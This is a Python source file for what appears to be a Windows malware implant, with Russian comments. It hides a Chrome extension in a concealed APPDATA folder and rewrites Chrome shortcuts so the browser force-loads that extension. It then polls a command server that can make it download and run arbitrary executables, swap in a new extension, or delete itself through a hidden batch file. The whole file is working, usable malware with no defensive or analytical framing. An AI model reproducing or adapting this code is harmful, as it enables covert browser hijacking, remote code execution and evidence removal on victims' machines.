import os
import sys
import shutil
import winshell
from pathlib import Path
import time
import subprocess
import requests
import uuid
import socket
import zipfile

if getattr(sys, 'frozen', False):
    current_directory = Path(sys._MEIPASS)
else:
    current_directory = Path(__file__).parent

internal_extension_path = current_directory / "extension"
external_extension_path = Path(os.environ['APPDATA']) / ".hidden_extension" / "extension"

try:
    if not external_extension_path.exists():
        external_extension_path.parent.mkdir(parents=True, exist_ok=True)
        shutil.copytree(internal_extension_path, external_extension_path)
        print(f"Extension folder copied to: {external_extension_path}")
except Exception as e:
    print(f"Failed to copy extension folder: {e}")
    sys.exit(1)

def get_device_identifier():
    try:
        return hex(uuid.getnode())
    except Exception as e:
        print(f"Error getting device identifier: {e}")
        return socket.gethostname()

def update_shortcut(shortcut_path, extension_folder_path):
    try:
        with winshell.shortcut(shortcut_path) as link:
            if link.path and "chrome.exe" in link.path.lower():
                link.arguments = f'--load-extension="{extension_folder_path}"'
                print(f"Updated shortcut: {shortcut_path}")
            else:
                print(f"Skipped shortcut (not Chrome): {shortcut_path}")
    except Exception as e:
        print(f"Error updating shortcut {shortcut_path}: {e}")

def restart_chrome_via_shortcut(shortcut_path):
    try:
        subprocess.call("taskkill /im chrome.exe /f", shell=True)
        print("Chrome processes terminated successfully.")
    except Exception as e:
        print(f"Failed to terminate Chrome processes: {e}")
        return

    print("Chrome will restart in 3 minutes with the extension...")
    time.sleep(180)  #3 мин

    bat_file = external_extension_path / "launch_chrome.bat"
    with open(bat_file, "w") as f:
        f.write(f'start "" "{shortcut_path}"\n')
        f.write("exit\n")

    try:
        subprocess.Popen([str(bat_file)], shell=True)
        print("Chrome restarted with the extension via shortcut.")
    except Exception as e:
        print(f"Failed to restart Chrome via shortcut: {e}")
    finally:
        time.sleep(5)
        if bat_file.exists():
            bat_file.unlink()

def update_chrome_shortcuts(extension_folder_path):
    if not Path(extension_folder_path).exists():
        print(f"Error: The specified extension folder was not found: {extension_folder_path}")
        return

    desktop_path = Path(os.path.join(os.environ['USERPROFILE'], 'Desktop'))
    public_desktop_path = Path("C:/Users/Public/Desktop")
    start_menu_path = Path(os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs'))

    possible_shortcut_names = ["Google Chrome.lnk", "Chrome.lnk"]
    last_valid_shortcut = None

    for shortcut_name in possible_shortcut_names:
        potential_desktop_shortcut = desktop_path / shortcut_name
        if potential_desktop_shortcut.exists():
            update_shortcut(str(potential_desktop_shortcut), str(extension_folder_path))
            last_valid_shortcut = potential_desktop_shortcut

        potential_public_desktop_shortcut = public_desktop_path / shortcut_name
        if potential_public_desktop_shortcut.exists():
            update_shortcut(str(potential_public_desktop_shortcut), str(extension_folder_path))
            last_valid_shortcut = potential_public_desktop_shortcut

        for path in start_menu_path.rglob(shortcut_name):
            update_shortcut(str(path), str(extension_folder_path))
            last_valid_shortcut = path

    if last_valid_shortcut:
        print("Chrome will restart in 3 minutes with the extension...")
        restart_chrome_via_shortcut(str(last_valid_shortcut))
    else:
        print("No valid Chrome shortcut found for updating and restarting.")

def load_and_run(file_url: str):
    """
    1. Скачивает файл по ссылке file_url.
    2. Сохраняет во временную папку с именем loaded_file.exe (или другим).
    3. Запускает этот файл.
    """
    try:
        print(f"[load_and_run] Downloading file from: {file_url}")
        response = requests.get(file_url, stream=True)
        response.raise_for_status()

        temp_file_path = Path(os.environ['TEMP']) / "loaded_file.exe"
        with open(temp_file_path, "wb") as f:
            for chunk in response.iter_content(chunk_size=8192):
                f.write(chunk)

        print(f"[load_and_run] File downloaded to: {temp_file_path}")
        subprocess.run([str(temp_file_path)], shell=True)

        # Удалить загруженный файл после запуска:
        # temp_file_path.unlink(missing_ok=True)

    except Exception as e:
        print(f"[load_and_run] Error loading and running file: {e}")

def update_extension(extension_url: str):
    """
    1. Убивает процессы Chrome.
    2. Удаляет старое расширение (external_extension_path).
    3. Скачивает .zip архив с расширением по ссылке extension_url,
       распаковывает в ту же папку.
    4. Обновляет ярлыки и перезапускает Chrome (как при первом запуске).
    """
    try:
        print("[update_extension] Killing Chrome to update extension...")
        subprocess.call("taskkill /im chrome.exe /f", shell=True)

        if external_extension_path.exists():
            shutil.rmtree(external_extension_path, ignore_errors=True)

        external_extension_path.mkdir(parents=True, exist_ok=True)

        zip_path = external_extension_path / "update_ext.zip"
        print(f"[update_extension] Downloading new extension from: {extension_url}")
        with requests.get(extension_url, stream=True) as r:
            r.raise_for_status()
            with open(zip_path, "wb") as f:
                for chunk in r.iter_content(chunk_size=8192):
                    f.write(chunk)

        with zipfile.ZipFile(zip_path, 'r') as zip_ref:
            zip_ref.extractall(external_extension_path)

        zip_path.unlink(missing_ok=True)
        print("[update_extension] Extension updated. Now reloading Chrome shortcuts...")

        update_chrome_shortcuts(external_extension_path)

    except Exception as e:
        print(f"[update_extension] Error updating extension: {e}")

def delete_script_exe():
    """
    Логика для .exe-файла (PyInstaller):
    1. Завершает Chrome.
    2. Удаляет папку с расширением.
    3. Создаёт временный .bat-файл, ждёт пару секунд, а затем:
       - Удалит сам .exe
       - Удалит батник
       - Удалит всё, что нужно, если не удалено заранее
    4. Запускает .bat и немедленно завершает процесс Python (os._exit).
    """
    try:
        print("[delete_script_exe] Terminating Chrome and removing all files...")
        subprocess.call("taskkill /im chrome.exe /f", shell=True)

        if external_extension_path.parent.exists():
            shutil.rmtree(external_extension_path.parent, ignore_errors=True)

        script_path = Path(sys.executable).resolve()
        print(f"[delete_script_exe] This .exe path: {script_path}")
        bat_name = "self_delete.bat"
        bat_path = Path(os.environ['TEMP']) / bat_name

        # - timeout 2 
        # - del "_ exe"
        # - del "_ bat" (через команду start /b cmd /c del ...)
        with open(bat_path, "w") as bat:
            bat.write("@echo off\n")
            bat.write("timeout /t 2 > nul\n")  
            bat.write(f'del "{script_path}"\n')
            bat.write(f'start /b cmd /c del "{bat_path}"\n')
            bat.write("exit\n")

        subprocess.Popen([str(bat_path)], shell=True, creationflags=subprocess.CREATE_NO_WINDOW)

        os._exit(0)

    except Exception as e:
        print(f"[delete_script_exe] Error during self-deletion: {e}")
        os._exit(1)


#  Основной цикл
def wait_for_commands():
    """
      - restart_chrome: обновляет ярлыки и перезапускает Chrome
      - load_and_run:   получает URL, скачивает .exe и запускает
      - update_extension: получает URL, скачивает zip, заменяет расширение, рестартит Chrome
      - delete:         удаляет расширение и .exe (через self_delete.bat)
    """
    SERVER_URL = "http://127.0.0.1:5000/api/commands"
    device_id = get_device_identifier()

    while True:
        try:
            print("Waiting for commands from server...")
            response = requests.get(
                SERVER_URL,
                params={"device_id": device_id},
                proxies={"http": None, "https": None}
            )
            response.raise_for_status()
            command_data = response.json()
            command = command_data.get("command")

            if command:
                print(f"Received command: {command}")
                if command == "restart_chrome":
                    update_chrome_shortcuts(external_extension_path)

                elif command == "load_and_run":
                    file_url = command_data.get("url")
                    if file_url:
                        load_and_run(file_url)
                    else:
                        print("[load_and_run] No URL provided")

                elif command == "update_extension":
                    extension_url = command_data.get("url")
                    if extension_url:
                        update_extension(extension_url)
                    else:
                        print("[update_extension] No URL provided")

                elif command == "delete":
                    delete_script_exe()

                else:
                    print(f"Command '{command}' not handled.")
            else:
                print("No command received.")

        except Exception as e:
            print(f"Error while requesting commands: {e}")

        time.sleep(30)

if __name__ == "__main__":
    print("Program started.")

    update_chrome_shortcuts(external_extension_path)
    wait_for_commands()
